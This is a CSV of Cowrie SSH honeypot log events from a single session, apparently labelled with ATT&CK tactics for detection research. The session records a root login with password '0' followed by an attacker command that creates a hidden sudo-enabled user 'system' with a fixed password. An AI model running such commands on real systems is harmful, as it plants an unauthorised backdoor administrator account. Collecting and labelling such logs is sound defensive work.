,event,session_id,session,labels
0,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:41410 (10.42.4.33:2222) [session: 09e8ecb95852]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 41410.0, ""timestamp"": ""2025-08-09T17:36:41.906957Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:41.907362Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
2,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:42.010892Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
3,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:42.323161Z"", ""username"": ""root"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
4,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:43.059323Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
5,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:43.059698Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
6,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 N2jgYtjg"", ""message"": ""CMD: openssl passwd -1 N2jgYtjg"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:43.060091Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
7,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 N2jgYtjg"", ""message"": ""Command not found: openssl passwd -1 N2jgYtjg"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:43.060644Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
8,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/488004919005ea7a3cb3b204244a025d140083773a216dbe78a1a7d97bbaa132 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""488004919005ea7a3cb3b204244a025d140083773a216dbe78a1a7d97bbaa132"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:43.165579Z"", ""ttylog"": ""var/lib/cowrie/tty/488004919005ea7a3cb3b204244a025d140083773a216dbe78a1a7d97bbaa132"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
9,"{""duration"": ""1.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.3 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T17:36:43.166127Z"", ""session_id"": ""09e8ecb95852""}",09e8ecb95852,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 N2jgYtjg) system  && sudo usermod -aG sudo system ; openssl passwd -1 N2jgYtjg;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
